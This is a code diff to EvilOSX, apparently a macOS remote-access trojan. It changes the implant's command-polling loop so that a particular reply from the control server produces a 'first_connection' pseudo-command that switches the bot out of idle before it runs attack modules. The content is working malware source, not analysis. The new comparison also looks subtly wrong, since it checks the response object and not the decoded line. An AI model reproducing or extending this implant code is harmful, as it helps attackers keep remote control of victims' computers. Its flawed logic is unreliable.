@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "3.1.2"
+__version__ = "3.2.2"
 
 import time
 import urllib2
@@ -93,8 +93,10 @@ def receive_command():
     else:
         response_line = response.read().decode()  # Can't be read twice.
 
-        if not response_line or response_line == "You dun goofed.":
+        if not response_line:
             return None
+        elif response == "You dun goofed.":
+            return Command(None, "first_connection")
         else:
             json_response = json.loads(response_line)
 
@@ -315,6 +317,11 @@ def main():
 
                 last_active = time.time()
                 idle = False
+
+                if command.command == "first_connection":
+                    # This isn't a command that can be run, used
+                    # to switch out of idle.
+                    continue
 
                 if command.module_name:
                     # Run a module.
